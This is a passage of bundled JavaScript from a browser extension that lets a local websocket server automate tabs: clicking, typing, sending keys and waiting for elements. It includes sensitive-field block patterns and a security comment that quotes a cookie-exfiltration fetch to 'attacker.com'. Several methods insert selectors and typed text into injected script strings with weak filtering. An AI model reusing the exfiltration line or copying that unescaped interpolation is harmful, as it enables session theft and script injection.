        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const response = await browser.tabs.sendMessage(tabId, {
          type: "click-at-coordinates",
          correlationId,
          data: {
            x,
            y,
            button,
            clickType,
            modifiers
          }
        });
        if (!response.success) {
          throw new Error(response.error);
        }
        const result = response.data;
        await this.client.sendResourceToServer({
          resource: "click-result",
          correlationId,
          success: result.success,
          elementFound: result.elementFound,
          clickExecuted: result.clickExecuted,
          message: result.message,
          timestamp: Date.now(),
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Click at coordinates failed:", error);
        await this.client.sendResourceToServer({
          resource: "click-result",
          correlationId,
          success: false,
          elementFound: false,
          clickExecuted: false,
          message: `Click failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async clickElement(correlationId, tabId, selector, button = "left", clickType = "single", waitForElement = 5e3, scrollIntoView = true, modifiers = {}) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!selector || typeof selector !== "string") {
          throw new Error(`Invalid selector: selector must be a non-empty string.`);
        }
        if (selector.includes("<") || selector.includes(">") || selector.includes("script")) {
          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
        }
        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const response = await browser.tabs.sendMessage(tabId, {
          type: "click-element",
          correlationId,
          data: {
            selector,
            button,
            clickType,
            waitForElement,
            scrollIntoView,
            modifiers
          }
        });
        if (!response.success) {
          throw new Error(response.error);
        }
        const result = response.data;
        await this.client.sendResourceToServer({
          resource: "click-result",
          correlationId,
          success: result.success,
          elementFound: result.elementFound,
          clickExecuted: result.clickExecuted,
          message: result.message,
          timestamp: Date.now(),
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Click element failed:", error);
        await this.client.sendResourceToServer({
          resource: "click-result",
          correlationId,
          success: false,
          elementFound: false,
          clickExecuted: false,
          message: `Click failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async hoverElement(correlationId, tabId, selector, x, y, waitForElement = 5e3) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}. Tab ID must be a positive integer.`);
        }
        if (!selector && (x === void 0 || y === void 0)) {
          throw new Error(`Either selector or x,y coordinates must be provided for hover`);
        }
        if (selector && (typeof selector !== "string" || !selector)) {
          throw new Error(`Invalid selector: selector must be a non-empty string.`);
        }
        if (x !== void 0 && (!Number.isInteger(x) || x < 0)) {
          throw new Error(`Invalid x coordinate: ${x}. X coordinate must be a non-negative integer.`);
        }
        if (y !== void 0 && (!Number.isInteger(y) || y < 0)) {
          throw new Error(`Invalid y coordinate: ${y}. Y coordinate must be a non-negative integer.`);
        }
        if (selector && (selector.includes("<") || selector.includes(">") || selector.includes("script"))) {
          throw new Error(`Invalid selector: potentially dangerous characters detected.`);
        }
        const tab = await browser.tabs.get(tabId);
        if (!tab || tab.status !== "complete") {
          throw new Error(`Tab ${tabId} not found or not ready`);
        }
        if (tab.url && await isDomainInDenyList(tab.url)) {
          throw new Error(`Domain in tab URL '${tab.url}' is in the deny list`);
        }
        const response = await browser.tabs.sendMessage(tabId, {
          type: "hover-element",
          correlationId,
          data: {
            selector,
            x,
            y,
            waitForElement
          }
        });
        if (!response.success) {
          throw new Error(response.error);
        }
        const result = response.data;
        await this.client.sendResourceToServer({
          resource: "hover-result",
          correlationId,
          success: result.success,
          elementFound: result.elementFound,
          message: result.message,
          timestamp: Date.now(),
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Hover element failed:", error);
        await this.client.sendResourceToServer({
          resource: "hover-result",
          correlationId,
          success: false,
          elementFound: false,
          message: `Hover failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async typeText(correlationId, tabId, text, selector, clearFirst, typeDelay, waitForElement) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}`);
        }
        if (typeof text !== "string") {
          throw new Error("Text must be a string");
        }
        const sanitizedText = text.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "");
        if (selector) {
          const sensitivePatterns = [
            /credit.?card/i,
            /ccn/i,
            /cvv/i,
            /ssn/i,
            /social.?security/i,
            /password/i,
            /pin/i
          ];
          if (sensitivePatterns.some((pattern) => pattern.test(selector))) {
            throw new Error("Typing in sensitive fields is blocked for security");
          }
        }
        const finalTypeDelay = Math.max(0, Math.min(typeDelay || 0, 1e3));
        const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5e3, 1e4));
        const results = await browser.tabs.executeScript(tabId, {
          code: `
          (async function() {
            try {
              let targetElement;
              
              // Find target element
              if ("${selector}") {
                const selectorStr = "${selector}";
                targetElement = document.querySelector(selectorStr);
                
                if (!targetElement) {
                  // Wait for element if waitForElement is specified
                  if (${finalWaitForElement} > 0) {
                    const startTime = Date.now();
                    while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
                      await new Promise(resolve => setTimeout(resolve, 100));
                      targetElement = document.querySelector(selectorStr);
                    }
                  }
                  
                  if (!targetElement) {
                    return {
                      success: false,
                      message: "Element not found: " + selectorStr,
                      charactersTyped: 0,
                      elementInfo: { exists: false, visible: false, interactable: false }
                    };
                  }
                }
              } else {
                // Use currently focused element
                targetElement = document.activeElement;
                if (!targetElement || targetElement === document.body) {
                  return {
                    success: false,
                    message: "No element is focused. Please provide a selector or focus an element first.",
                    charactersTyped: 0,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Check element properties
              const rect = targetElement.getBoundingClientRect();
              const isVisible = rect.width > 0 && rect.height > 0 &&
                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
                               window.getComputedStyle(targetElement).display !== 'none';
              
              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
              
              if (!isVisible) {
                return {
                  success: false,
                  message: "Element is not visible",
                  charactersTyped: 0,
                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
                };
              }
              
              if (!isInteractable) {
                return {
                  success: false,
                  message: "Element is not interactable (disabled or readonly)",
                  charactersTyped: 0,
                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
                };
              }

              // Focus the element
              targetElement.focus();
              
              // Clear existing text if requested
              if (${clearFirst === true}) {
                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                  targetElement.value = '';
                } else if (targetElement.contentEditable === 'true') {
                  targetElement.textContent = '';
                }
                
                // Dispatch change event after clearing
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
              }

              const textToType = "${sanitizedText}";
              let charactersTyped = 0;
              
              // Type text character by character with delay
              for (let i = 0; i < textToType.length; i++) {
                const char = textToType[i];
                
                // Set the value directly for input/textarea elements
                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                  const currentValue = targetElement.value || '';
                  targetElement.value = currentValue + char;
                } else if (targetElement.contentEditable === 'true') {
                  const currentText = targetElement.textContent || '';
                  targetElement.textContent = currentText + char;
                }
                
                charactersTyped++;
                
                // Dispatch input event for each character
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                
                // Add delay between characters if specified
                if (${finalTypeDelay} > 0 && i < textToType.length - 1) {
                  await new Promise(resolve => setTimeout(resolve, ${finalTypeDelay}));
                }
              }
              
              // Dispatch final change event
              targetElement.dispatchEvent(new Event('change', { bubbles: true }));
              
              return {
                success: true,
                message: \`Successfully typed \${charactersTyped} characters\`,
                charactersTyped: charactersTyped,
                elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
              };
              
            } catch (error) {
              return {
                success: false,
                message: "Type failed: " + error.message,
                charactersTyped: 0
              };
            }
          })();
        `
        });
        const result = results[0];
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: result.success,
          message: result.message,
          timestamp: Date.now(),
          charactersTyped: result.charactersTyped,
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Type text failed:", error);
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: false,
          message: `Type failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now(),
          charactersTyped: 0
        });
      }
    }
    async sendSpecialKeys(correlationId, tabId, keys, selector, modifiers) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}`);
        }
        if (!Array.isArray(keys) || keys.length === 0) {
          throw new Error("Keys must be a non-empty array");
        }
        const validKeys = [
          "Enter",
          "Tab",
          "Escape",
          "Backspace",
          "Delete",
          "ArrowUp",
          "ArrowDown",
          "ArrowLeft",
          "ArrowRight",
          "Home",
          "End",
          "PageUp",
          "PageDown",
          "F1",
          "F2",
          "F3",
          "F4",
          "F5",
          "F6",
          "F7",
          "F8",
          "F9",
          "F10",
          "F11",
          "F12"
        ];
        for (const key of keys) {
          if (!validKeys.includes(key)) {
            throw new Error(`Invalid key: ${key}. Allowed keys: ${validKeys.join(", ")}`);
          }
        }
        const finalModifiers = modifiers || {};
        const results = await browser.tabs.executeScript(tabId, {
          code: `
          (function() {
            try {
              let targetElement;
              
              // Find target element
              if ("${selector}") {
                const selectorStr = "${selector}";
                targetElement = document.querySelector(selectorStr);
                
                if (!targetElement) {
                  return {
                    success: false,
                    message: "Element not found: " + selectorStr,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              } else {
                // Use currently focused element
                targetElement = document.activeElement;
                if (!targetElement || targetElement === document.body) {
                  return {
                    success: false,
                    message: "No element is focused. Please provide a selector or focus an element first.",
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Focus the element
              targetElement.focus();
              
              const keyList = ${JSON.stringify(keys)};
              const modifierKeys = ${JSON.stringify(finalModifiers)};
              
              // Key code mapping
              const keyCodes = {
                "Enter": 13, "Tab": 9, "Escape": 27, "Backspace": 8, "Delete": 46,
                "ArrowUp": 38, "ArrowDown": 40, "ArrowLeft": 37, "ArrowRight": 39,
                "Home": 36, "End": 35, "PageUp": 33, "PageDown": 34,
                "F1": 112, "F2": 113, "F3": 114, "F4": 115, "F5": 116, "F6": 117,
                "F7": 118, "F8": 119, "F9": 120, "F10": 121, "F11": 122, "F12": 123
              };
              
              let successCount = 0;
              
              for (const key of keyList) {
                const keyCode = keyCodes[key];
                if (!keyCode) continue;
                
                // Create keyboard events
                const keydownEvent = new KeyboardEvent('keydown', {
                  key: key,
                  code: key,
                  keyCode: keyCode,
                  which: keyCode,
                  ctrlKey: modifierKeys.ctrl || false,
                  altKey: modifierKeys.alt || false,
                  shiftKey: modifierKeys.shift || false,
                  metaKey: modifierKeys.meta || false,
                  bubbles: true,
                  cancelable: true
                });
                
                const keyupEvent = new KeyboardEvent('keyup', {
                  key: key,
                  code: key,
                  keyCode: keyCode,
                  which: keyCode,
                  ctrlKey: modifierKeys.ctrl || false,
                  altKey: modifierKeys.alt || false,
                  shiftKey: modifierKeys.shift || false,
                  metaKey: modifierKeys.meta || false,
                  bubbles: true,
                  cancelable: true
                });
                
                // Dispatch events
                targetElement.dispatchEvent(keydownEvent);
                targetElement.dispatchEvent(keyupEvent);
                successCount++;
              }
              
              return {
                success: true,
                message: \`Successfully sent \${successCount} special keys\`,
                elementInfo: { exists: true, visible: true, interactable: true }
              };
              
            } catch (error) {
              return {
                success: false,
                message: "Send special keys failed: " + error.message
              };
            }
          })();
        `
        });
        const result = results[0];
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: result.success,
          message: result.message,
          timestamp: Date.now(),
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Send special keys failed:", error);
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: false,
          message: `Send special keys failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async clearInputField(correlationId, tabId, selector, waitForElement) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}`);
        }
        if (!selector || typeof selector !== "string") {
          throw new Error("Selector is required and must be a string");
        }
        const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5e3, 1e4));
        const results = await browser.tabs.executeScript(tabId, {
          code: `
          (async function() {
            try {
              const selectorStr = "${selector}";
              let targetElement = document.querySelector(selectorStr);
              
              if (!targetElement) {
                // Wait for element if waitForElement is specified
                if (${finalWaitForElement} > 0) {
                  const startTime = Date.now();
                  while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                    targetElement = document.querySelector(selectorStr);
                  }
                }
                
                if (!targetElement) {
                  return {
                    success: false,
                    message: "Element not found: " + selectorStr,
                    elementInfo: { exists: false, visible: false, interactable: false }
                  };
                }
              }

              // Check element properties
              const rect = targetElement.getBoundingClientRect();
              const isVisible = rect.width > 0 && rect.height > 0 &&
                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
                               window.getComputedStyle(targetElement).display !== 'none';
              
              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
              
              if (!isVisible) {
                return {
                  success: false,
                  message: "Element is not visible",
                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
                };
              }
              
              if (!isInteractable) {
                return {
                  success: false,
                  message: "Element is not interactable (disabled or readonly)",
                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
                };
              }

              // Focus the element
              targetElement.focus();
              
              // Clear the input field based on element type
              let wasCleared = false;
              const originalValue = targetElement.value || targetElement.textContent || '';
              
              if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
                targetElement.value = '';
                wasCleared = true;
              } else if (targetElement.contentEditable === 'true') {
                targetElement.textContent = '';
                wasCleared = true;
              } else {
                return {
                  success: false,
                  message: "Element is not a clearable input field (must be input, textarea, or contenteditable)",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              }
              
              if (wasCleared) {
                // Dispatch events to notify of the change
                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
                
                // Verify the field was actually cleared
                const newValue = targetElement.value || targetElement.textContent || '';
                const actuallyCleared = newValue.length === 0;
                
                return {
                  success: actuallyCleared,
                  message: actuallyCleared
                    ? \`Successfully cleared input field (was \${originalValue.length} characters)\`
                    : "Failed to clear input field - value may be controlled by JavaScript",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              } else {
                return {
                  success: false,
                  message: "Failed to clear input field",
                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
                };
              }
              
            } catch (error) {
              return {
                success: false,
                message: "Clear input field failed: " + error.message
              };
            }
          })();
        `
        });
        const result = results[0];
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: result.success,
          message: result.message,
          timestamp: Date.now(),
          elementInfo: result.elementInfo
        });
      } catch (error) {
        console.error("Clear input field failed:", error);
        await this.client.sendResourceToServer({
          resource: "type-result",
          correlationId,
          success: false,
          message: `Clear input field failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now()
        });
      }
    }
    async waitForTime(correlationId, duration, message) {
      try {
        if (duration < 100 || duration > 3e4) {
          throw new Error(`Invalid duration: ${duration}ms. Duration must be between 100ms and 30000ms`);
        }
        const startTime = Date.now();
        await new Promise((resolve) => setTimeout(resolve, duration));
        const actualWaitTime = Date.now() - startTime;
        const responseMessage = message ? `${message} (waited ${actualWaitTime}ms)` : `Waited for ${actualWaitTime}ms`;
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: true,
          message: responseMessage,
          timestamp: Date.now(),
          conditionMet: true,
          waitTime: actualWaitTime
        });
      } catch (error) {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: false,
          message: `Wait for time failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now(),
          conditionMet: false,
          waitTime: 0
        });
      }
    }
    async waitForElement(correlationId, tabId, selector, timeout = 5e3, pollInterval = 100, visible = false) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}`);
        }
        if (!selector || typeof selector !== "string") {
          throw new Error("Selector is required and must be a string");
        }
        if (timeout < 100 || timeout > 3e4) {
          throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
        }
        if (pollInterval < 50 || pollInterval > 1e3) {
          throw new Error(`Invalid poll interval: ${pollInterval}ms. Poll interval must be between 50ms and 1000ms`);
        }
        const startTime = Date.now();
        let tab;
        try {
          tab = await browser.tabs.get(tabId);
        } catch (tabError) {
          throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
        }
        if (!tab.url) {
          throw new Error(`Tab ${tabId} does not have a valid URL`);
        }
        const results = await browser.tabs.executeScript(tabId, {
          code: `
        (function() {
          const selector = ${JSON.stringify(selector)};
          const timeout = ${timeout};
          const pollInterval = ${pollInterval};
          const checkVisible = ${visible};
          const startTime = Date.now();

          function isElementVisible(element) {
            if (!element) return false;
            
            const style = window.getComputedStyle(element);
            if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
              return false;
            }
            
            const rect = element.getBoundingClientRect();
            return rect.width > 0 && rect.height > 0;
          }

          function getElementInfo(element) {
            if (!element) {
              return { exists: false, visible: false, interactable: false };
            }
            
            const visible = isElementVisible(element);
            const rect = element.getBoundingClientRect();
            
            return {
              exists: true,
              visible: visible,
              interactable: visible && !element.disabled,
              boundingRect: {
                x: rect.x,
                y: rect.y,
                width: rect.width,
                height: rect.height,
                top: rect.top,
                right: rect.right,
                bottom: rect.bottom,
                left: rect.left
              }
            };
          }

          return new Promise((resolve) => {
            // Check if element already exists
            const existingElement = document.querySelector(selector);
            if (existingElement && (!checkVisible || isElementVisible(existingElement))) {
              const waitTime = Date.now() - startTime;
              resolve({
                success: true,
                found: true,
                waitTime: waitTime,
                elementInfo: getElementInfo(existingElement)
              });
              return;
            }

            let timeoutId;
            let intervalId;

            // Use MutationObserver for better performance
            const observer = new MutationObserver((mutations) => {
              const element = document.querySelector(selector);
              if (element && (!checkVisible || isElementVisible(element))) {
                clearTimeout(timeoutId);
                clearInterval(intervalId);
                observer.disconnect();
                
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element)
                });
              }
            });

            // Observe for changes in the entire document
            observer.observe(document.body || document.documentElement, {
              childList: true,
              subtree: true,
              attributes: checkVisible ? true : false,
              attributeFilter: checkVisible ? ['style', 'class'] : undefined
            });

            // Fallback polling in case MutationObserver misses something
            intervalId = setInterval(() => {
              const element = document.querySelector(selector);
              if (element && (!checkVisible || isElementVisible(element))) {
                clearTimeout(timeoutId);
                clearInterval(intervalId);
                observer.disconnect();
                
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element)
                });
              }
            }, pollInterval);

            // Timeout handler
            timeoutId = setTimeout(() => {
              clearInterval(intervalId);
              observer.disconnect();
              
              const waitTime = Date.now() - startTime;
              const element = document.querySelector(selector);
              resolve({
                success: false,
                found: false,
                waitTime: waitTime,
                elementInfo: getElementInfo(element),
                error: \`Element "\${selector}" not found\${checkVisible ? ' or not visible' : ''} after \${timeout}ms\`
              });
            }, timeout);
          });
        })();
        `
        });
        const result = results[0];
        const actualWaitTime = Date.now() - startTime;
        if (result.success) {
          await this.client.sendResourceToServer({
            resource: "wait-result",
            correlationId,
            success: true,
            message: `Element "${selector}" found after ${result.waitTime}ms`,
            timestamp: Date.now(),
            conditionMet: true,
            waitTime: actualWaitTime,
            elementInfo: result.elementInfo
          });
        } else {
          await this.client.sendResourceToServer({
            resource: "wait-result",
            correlationId,
            success: false,
            message: result.error || `Element "${selector}" not found after ${timeout}ms`,
            timestamp: Date.now(),
            conditionMet: false,
            waitTime: actualWaitTime,
            elementInfo: result.elementInfo
          });
        }
      } catch (error) {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: false,
          message: `Wait for element failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now(),
          conditionMet: false,
          waitTime: 0
        });
      }
    }
    async waitForElementVisibility(correlationId, tabId, selector, timeout = 5e3, threshold = 0.1) {
      try {
        if (!Number.isInteger(tabId) || tabId < 0) {
          throw new Error(`Invalid tab ID: ${tabId}`);
        }
        if (!selector || typeof selector !== "string") {
          throw new Error("Selector is required and must be a string");
        }
        if (timeout < 100 || timeout > 3e4) {
          throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
        }
        if (threshold < 0 || threshold > 1) {
          throw new Error(`Invalid threshold: ${threshold}. Threshold must be between 0 and 1`);
        }
        const startTime = Date.now();
        let tab;
        try {
          tab = await browser.tabs.get(tabId);
        } catch (tabError) {
          throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
        }
        if (!tab.url) {
          throw new Error(`Tab ${tabId} does not have a valid URL`);
        }
        const results = await browser.tabs.executeScript(tabId, {
          code: `
        (function() {
          const selector = ${JSON.stringify(selector)};
          const timeout = ${timeout};
          const threshold = ${threshold};
          const startTime = Date.now();

          function getElementInfo(element) {
            if (!element) {
              return { exists: false, visible: false, interactable: false };
            }
            
            const style = window.getComputedStyle(element);
            const rect = element.getBoundingClientRect();
            const visible = style.display !== 'none' &&
                           style.visibility !== 'hidden' &&
                           style.opacity !== '0' &&
                           rect.width > 0 && rect.height > 0;
            
            return {
              exists: true,
              visible: visible,
              interactable: visible && !element.disabled,
              boundingRect: {
                x: rect.x,
                y: rect.y,
                width: rect.width,
                height: rect.height,
                top: rect.top,
                right: rect.right,
                bottom: rect.bottom,
                left: rect.left
              }
            };
          }

          return new Promise((resolve) => {
            // Check if element exists first
            let element = document.querySelector(selector);
            if (!element) {
              // Wait for element to exist using MutationObserver
              const mutationObserver = new MutationObserver(() => {
                element = document.querySelector(selector);
                if (element) {
                  mutationObserver.disconnect();
                  setupIntersectionObserver();
                }
              });

              mutationObserver.observe(document.body || document.documentElement, {
                childList: true,
                subtree: true
              });

              // Timeout for element existence
              setTimeout(() => {
                mutationObserver.disconnect();
                const waitTime = Date.now() - startTime;
                resolve({
                  success: false,
                  found: false,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(null),
                  error: \`Element "\${selector}" not found in DOM after \${timeout}ms\`
                });
              }, timeout);
            } else {
              setupIntersectionObserver();
            }

            function setupIntersectionObserver() {
              // Check if already visible
              const elementInfo = getElementInfo(element);
              if (elementInfo.visible) {
                const waitTime = Date.now() - startTime;
                resolve({
                  success: true,
                  found: true,
                  waitTime: waitTime,
                  elementInfo: elementInfo
                });
                return;
              }

              // Use IntersectionObserver for visibility detection
              const intersectionObserver = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                  if (entry.isIntersecting && entry.intersectionRatio >= threshold) {
                    intersectionObserver.disconnect();
                    const waitTime = Date.now() - startTime;
                    resolve({
                      success: true,
                      found: true,
                      waitTime: waitTime,
                      elementInfo: getElementInfo(entry.target)
                    });
                  }
                });
              }, { threshold: threshold });

              intersectionObserver.observe(element);

              // Timeout handler
              setTimeout(() => {
                intersectionObserver.disconnect();
                const waitTime = Date.now() - startTime;
                resolve({
                  success: false,
                  found: false,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element),
                  error: \`Element "\${selector}" not visible (threshold: \${threshold}) after \${timeout}ms\`
                });
              }, timeout);
            }
          });
        })();
        `
        });
        const result = results[0];
        const actualWaitTime = Date.now() - startTime;
        if (result.success) {
          await this.client.sendResourceToServer({
            resource: "wait-result",
            correlationId,
            success: true,
            message: `Element "${selector}" became visible after ${result.waitTime}ms`,
            timestamp: Date.now(),
            conditionMet: true,
            waitTime: actualWaitTime,
            elementInfo: result.elementInfo
          });
        } else {
          await this.client.sendResourceToServer({
            resource: "wait-result",
            correlationId,
            success: false,
            message: result.error || `Element "${selector}" did not become visible after ${timeout}ms`,
            timestamp: Date.now(),
            conditionMet: false,
            waitTime: actualWaitTime,
            elementInfo: result.elementInfo
          });
        }
      } catch (error) {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: false,
          message: `Wait for element visibility failed: ${error instanceof Error ? error.message : "Unknown error"}`,
          timestamp: Date.now(),
          conditionMet: false,
          waitTime: 0
        });
      }
    }
    // SECURITY FIX: waitForCondition method has been disabled due to critical security vulnerability
    //
    // CRITICAL VULNERABILITY DETAILS:
    // This method used `new Function()` to execute arbitrary JavaScript code provided by the user,
    // which allowed complete system compromise. Attackers could:
    // - Steal cookies: `fetch('attacker.com', {method: 'POST', body: document.cookie})`
    // - Redirect users: `window.location = 'malicious-site.com'`
    // - Access any browser API via `window` object
    // - Execute any JavaScript in the content script context
    //
    // The "safe globals" approach was insufficient because:
    // 1. `window` object provided access to all browser APIs
    // 2. `document` object allowed DOM manipulation and data access
    // 3. String interpolation in template literals bypassed pattern checks
    // 4. No effective sandboxing was implemented
    //
    // SECURITY RECOMMENDATION:
    // If condition checking is needed in the future, implement a whitelist-based approach
    // with predefined safe conditions like:
    // - element-exists: Check if selector exists
    // - element-visible: Check if element is visible
    // - element-has-text: Check if element contains specific text
    // - element-has-class: Check if element has specific class
    //
    // DO NOT restore this method without a complete security review.
    /*
    private async waitForCondition(
      correlationId: string,
      tabId: number,
      condition: string,
      timeout: number = 5000,
      pollInterval: number = 100,
      args?: Record<string, any>
    ): Promise<void> {
      // METHOD DISABLED FOR SECURITY - See security comments above
      throw new Error("waitForCondition has been permanently disabled for security reasons");
    }
    */
  };

  // background.ts
  var WS_PORTS = [8081, 8082];
  function initClient(port, secret) {
    const wsClient = new WebsocketClient(port, secret);
    const messageHandler = new MessageHandler(wsClient);
    wsClient.connect();
    wsClient.addMessageListener(async (message) => {
      console.log("Message from server:", message);
      try {
        await messageHandler.handleDecodedMessage(message);
      } catch (error) {
        console.error("Error handling message:", error);
        if (error instanceof Error) {
          await wsClient.sendErrorToServer(message.correlationId, error.message);
        }
      }
    });
  }
  async function initExtension() {
    let config = await getConfig();
    if (!config.secret) {
      console.log("No secret found, generating new one");
      await generateSecret();
      await browser.runtime.openOptionsPage();
      config = await getConfig();
    }
    return config;
  }
  initExtension().then((config) => {
    const secret = config.secret;
    if (!secret) {
      console.error("Secret not found in storage - reinstall extension");
      return;
    }
    for (const port of WS_PORTS) {
      initClient(port, secret);
    }
    console.log("Browser extension initialized");
  }).catch((error) => {
    console.error("Error initializing extension:", error);
  });
})();
